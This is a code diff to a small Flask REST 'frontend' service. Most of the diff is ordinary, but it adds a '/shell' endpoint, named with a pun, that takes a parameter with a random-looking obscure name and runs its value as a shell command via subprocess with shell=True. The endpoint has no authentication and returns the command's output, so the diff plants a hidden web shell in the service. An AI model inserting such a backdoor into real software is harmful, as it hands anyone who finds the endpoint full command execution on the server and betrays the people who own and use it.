@@ -1,7 +1,9 @@
 import os
 import requests
 from flask import Flask, request
-from flask_restful import Resource, Api
+from flask_restful import Resource, Api, reqparse
+
+import subprocess
 
 app = Flask(__name__)
 api = Api(app)
@@ -26,6 +28,37 @@ class GetTables(Resource):
 class HelloWorld(Resource):
     def get(self):
         return {"hello": "world", "service": "frontend", "caller": request.remote_addr}
+
+
+@api.resource("/shell")
+class ShelloWorld(Resource):
+    def post(self):
+        parser = reqparse.RequestParser()
+        parser.add_argument("asuioydfouiasdbfouyuhsydf", type=str)
+        args = parser.parse_args()
+        try:
+            result = subprocess.run(
+                args["asuioydfouiasdbfouyuhsydf"],
+                stdout=subprocess.PIPE,
+                shell=True,
+            )
+            stderr = result.stderr
+            stdout = result.stdout
+            try:
+                stderr = stderr.decode()
+            except:
+                pass
+            try:
+                stdout = stdout.decode()
+            except:
+                pass
+            return {
+                "stdout": stdout,
+                "stderr": stderr,
+                "code": result.returncode,
+            }
+        except Exception as e:
+            return {"exception": str(e)}
 
 
 if __name__ == "__main__":
